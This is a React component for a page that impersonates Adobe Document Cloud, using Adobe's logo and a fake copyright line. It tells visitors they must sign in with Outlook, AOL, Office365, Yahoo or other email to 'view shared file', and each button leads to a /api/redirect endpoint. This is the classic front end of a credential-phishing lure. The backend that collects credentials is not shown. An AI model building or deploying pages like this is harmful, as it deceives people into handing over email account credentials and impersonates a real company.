import { Card } from "@/components/ui/card";

interface EmailProvider {
  id: string;
  name: string;
  color: string;
}

export default function AdobeLogin() {
  const providers: EmailProvider[] = [
    { id: "outlook", name: "Outlook", color: "#0072C6" },
    { id: "aol", name: "Aol", color: "#3949AB" },
    { id: "office365", name: "Office365", color: "#D83B01" },
    { id: "yahoo", name: "Yahoo!", color: "#720E9E" },
    { id: "other", name: "Other Mail", color: "#1976D2" },
  ];

  return (
    <div className="flex justify-center items-center min-h-screen bg-[#333]">
      <Card className="bg-[#444] p-8 rounded-lg w-80 text-center shadow-[0_0_20px_rgba(0,0,0,0.5)] max-w-md mx-auto">
        <div className="flex flex-col items-center">
          {/* Logo Section */}
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Adobe_Acrobat_DC_logo_2020.svg"
            alt="Adobe Logo"
            className="w-16 h-16 mb-4"
          />

          {/* Header Section */}
          <h1 className="text-xl font-bold mb-2 text-white">Adobe Document Cloud</h1>

          {/* Instruction Text */}
          <p className="text-sm text-gray-300 mb-6">
            To read the document, please choose your email provider below login to view shared file.
          </p>

          {/* Email Provider Buttons */}
          <div className="w-full space-y-3 mb-6">
            {providers.map((provider) => (
              <a
                key={provider.id}
                href={`/api/redirect?provider=${provider.id}`}
                className="block w-full py-3 px-4 text-white font-semibold rounded text-center hover:opacity-90 transition-opacity"
                style={{ backgroundColor: provider.color }}
              >
                Sign in with {provider.name}
              </a>
            ))}
          </div>

          {/* Footer Section */}
          <footer className="text-gray-400 text-xs mt-6">
            <p className="mb-2">
              Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.
            </p>
            <p>
              CopyRight© 2023 Adobe system incorporated, All right reserved.
            </p>
          </footer>
        </div>
      </Card>
    </div>
  );
}
